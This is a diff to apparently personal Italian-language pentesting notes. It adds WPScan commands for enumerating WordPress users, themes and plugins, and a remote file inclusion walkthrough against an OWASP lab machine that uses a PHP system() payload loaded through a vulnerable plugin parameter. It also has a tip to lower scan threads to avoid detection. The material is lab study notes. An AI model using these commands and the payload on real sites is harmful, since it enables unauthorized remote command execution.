@@ -101,4 +101,27 @@ SQL-Inj Blind***
 
 
 ***CSRF - Cross Site Request Forgery ***
-l'applicazione lato server non analizza da dove viene la richiesta. a questo punto, tramite la 
+l'applicazione lato server non analizza da dove viene la richiesta.
+
+
+***WP SCAN***
+	esegue vulnerability assesment su macchine che hanno wordpress
+	wpscan --url http://[URL]
+	enumerare gli utenti  -->  wpscan --url http://192.168.1.12/wordpress --enumerate u
+	enumerare i temi  -->  wpscan --url http://192.168.1.12/wordpress --enumerate u t
+	all plugin  -->  wpscan --url http://192.168.1.12/wordpress --enumerate ap
+
+	abbassare il numero dei thread, per evitare di essere intercettato
+
+	***RFI su macchina OWASP - Wordpress***
+		creo un file wp-config.php con del contenuto malevolo <?php system("id;pwd;date;ls"); ?>
+		salvo il file sul mio webserver
+		disabilito il moduo php della mia macchina
+		http://192.168.1.12/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://192.168.1.32/
+
+
+
+***NOTE IMPORTANTI***
+abilitare modulo php -->   a2enmod php7.2 
+disabilitare modulo php -->   a2dismod php7.2 
+
